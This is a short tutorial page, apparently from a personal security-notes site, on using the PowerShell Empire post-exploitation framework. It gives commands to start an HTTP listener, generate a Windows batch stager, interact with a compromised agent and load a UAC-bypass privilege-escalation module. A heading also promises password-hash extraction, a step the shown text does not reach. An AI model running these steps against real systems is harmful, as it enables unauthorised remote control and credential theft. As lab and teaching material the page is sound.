# Welcome to Cyber Secure Labs

Created: December 9, 2021 7:33 PM

Public Site for sharing security writes

## Post Exploitation

### Working with Powershell Empire

Empire is a “PowerShell and Python post-exploitation agent” with a heavy focus on client-side

Windows Platform: Exploitation and post exploits are performed using Powershell.

Linux & macOS: Exploitation requires Python 2.6 or 2.7

In the latest version of Powershell Empire comes with a cleint-server model.

To start the server, the command is below:

```bash
sudo powershell-empire server

```

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled.png)

To start the client, the command is below:

```bash
sudo powershell-empire client

```

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%201.png)

After starting both the client an server, the methodology used to carry out an attack are as follows:

1. Start a Listener
2. Start a Stager
3. Listing the Agents
4. Interact with the agents
5. Run Post Exploitation commands

### Setting up a listener:

```
uselistener http

set Name test2

set Host 192.168.119.208

set Port 4444

execute

```

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%202.png)

### Setting up a stager:

```
usestager windows/launcher_bat

set Listener test

execute

```

### Setting up a stager:

```
agents

```

### Interacting with an agent

```
interact S2PRDACB

```

### Post Exploitation Commands:

```
info

```

### Elevating Privileges and Extracting Password Hashes

To do this, type the following command:

```
usemodule powershell/privesc/bypassuac_env

```

Set Listener to http, since we are using a http listener, and Agent to the agent from the victim machine.

use the info command to see what options are needed to be set.

```
info

```
